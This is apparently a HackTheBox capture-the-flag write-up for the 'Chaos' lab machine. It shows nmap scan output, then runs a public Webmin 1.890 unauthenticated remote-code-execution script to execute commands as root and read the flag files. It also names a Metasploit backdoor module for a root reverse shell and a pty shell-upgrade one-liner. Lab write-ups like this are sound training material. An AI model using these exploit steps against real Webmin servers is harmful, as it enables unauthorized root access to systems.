# HTB-Chaos
HackTheBox Chaos Machine WriteUp

10.10.10.120

PORT      STATE SERVICE  VERSION
80/tcp    open  http     Apache httpd 2.4.34 ((Ubuntu))
|_http-server-header: Apache/2.4.34 (Ubuntu)
|_http-title: Chaos
110/tcp   open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_pop3-capabilities: STLS CAPA SASL RESP-CODES TOP AUTH-RESP-CODE UIDL PIPELINING
143/tcp   open  imap     Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: listed have ENABLE STARTTLS capabilities IMAP4rev1 more LOGINDISABLEDA0001 ID SASL-IR OK Pre-login IDLE post-login LOGIN-REFERRALS LITERAL+
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_imap-capabilities: listed LOGIN-REFERRALS have capabilities ENABLE more IMAP4rev1 ID SASL-IR OK Pre-login IDLE post-login AUTH=PLAINA0001 LITERAL+
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=chaos
| Subject Alternative Name: DNS:chaos
| Not valid before: 2018-10-28T10:01:49
|_Not valid after:  2028-10-25T10:01:49
|_pop3-capabilities: SASL(PLAIN) CAPA USER RESP-CODES TOP AUTH-RESP-CODE UIDL PIPELINING
|_ssl-date: TLS randomness does not represent time
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Looking closer at the port 10000 webmin server, I try to log in with default credentials but nothing really sticks.
After some tries, I start to capture the login requests to look for interesting headers.
The webmin miniserv 1.890 is part of the header once more, and I make a quick google search for any relevant
vulnerabilities or exploits.
Lo and behold, i find the following repository:
https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE

This sounds extremely promising, so I pull the script and fire it up:
  
  $ python3 webminExploit.py 10.10.10.120 10000 id
  This gives me the id command, great success.

  Lets see which user we got access as:
  $ python3 webminExploit.py 10.10.10.120 10000 whoami
    root 

  Oh my!

  Lets find the user flag
  $ python3 webminExploit.py 10.10.10.120 10000 "ls /home/"
  $ python3 webminExploit.py 10.10.10.120 10000 "ls /home/ayush/"
  $ python3 webminExploit.py 10.10.10.120 10000 "cat /home/ayush/user.txt"

  And the root flag
  $ python3 webminExploit.py 10.10.10.120 10000 "cat /root/root.txt"


If you want a reverse shell, and don't mind using metasploit, the following module gives you a reverse shell as root:

  msf6 exploit(linux/http/webmin_backdoor) > exploit

Remember to upgrade the shell with python:

	python3 -c "import pty;pty.spawn('/bin/bash');"
	root@chaos:/usr/share/webmin/
